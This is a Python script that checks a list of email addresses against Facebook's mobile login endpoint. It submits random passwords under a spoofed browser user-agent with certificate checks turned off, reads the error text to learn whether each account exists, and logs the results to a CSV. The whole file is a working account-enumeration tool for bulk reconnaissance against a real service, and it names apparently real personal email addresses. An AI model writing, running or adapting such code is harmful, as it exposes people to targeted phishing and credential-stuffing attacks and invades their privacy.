import requests
import re
import csv
import time
import random
import string
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Method to check a user exists on facebook or not.
def userExists(identity):
    #identity = 'nishant260190@gmail.com'
    try:
        headers = {};
        headers["accept-language"] = "en-GB,en-US;q=0.9,en;q=0.8"
        headers["content-type"] = "application/x-www-form-urlencoded"    
        headers["user-agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.2359.139 Safari/537.36"
        N = random.randint(5,15)
        passw = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(N))
        #print(passw)
        formdata = {"email" : identity, "pass" : passw, "prefill_contact_point" : identity}
        url = "https://m.facebook.com/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2F&lwv=100";
        
        htmlResponse =  requests.post(url, data = formdata, headers = headers, verify=False);
        time.sleep(.8)
        exp = re.match(r'(?is).*(m_login_notice.*The password you entered is incorrect)' , str(htmlResponse.content));
        if exp is None:
            exp = re.match(r'(?is).*invalid\s*username\s*or\s*password' , str(htmlResponse.content));
            if exp:
                return "breakCode"
    except Exception as ex:
        print(ex);
        return None;
    if exp :
        return True;
    else :
        return False;

# Method to save information in to csv.
def saveToFile(data):
    with open('K_Email_fbUserInfo.csv', 'a') as csvfile:
        fieldnames =['user', 'exists'];
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
        for entries in data:
            writer.writerow(entries)

print("\n************* START *************\n");
print("\nchecking for default account exists or not : " + str(userExists("esha_gupta@hotmail.com")))
finalData = [];
print("Start time : " + str(time.time()));

# variable index used just as a counter            
index = 0;

# writing csv headers only 
with open('K_Email_fbUserInfo.csv', 'a') as csvfile:
    fieldnames =['user', 'exists'];
    writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
    writer.writeheader()
    
# Reading email csv and process main id one by one.
with open('K_Email_dataset_1.csv', 'r') as csvfile:
    textReader = csv.reader(csvfile, delimiter=' ', quotechar='|')
    for row in textReader:
        exists = userExists(row[0]);
        if exists == "breakCode":
            saveToFile(finalData)
            print("\n Script failed : default message invalid username or passord is receiving now")
            exit()
        index = index + 1;
        print(str(index) + " - " + str(row[0]) + " : " + str(exists));
        
        if exists == None:
            continue;
            
        userInfo = {};
        userInfo["user"] = row[0];
        userInfo['exists'] = exists;
        finalData.append(userInfo);

        if len(finalData) >= 100 :

            print("\nchecking for default account exists or not : " + str(userExists("esha_gupta@hotmail.com")))            
            print("\n************ Going to write in csv file up to index {} ************\n".format(index))
            print(time.time())
            saveToFile(finalData);
            finalData = [];
        
    if len(finalData) > 0 :
        print("\n************ Going to write in csv file up to index {} ************\n".format(index))
        saveToFile(finalData);
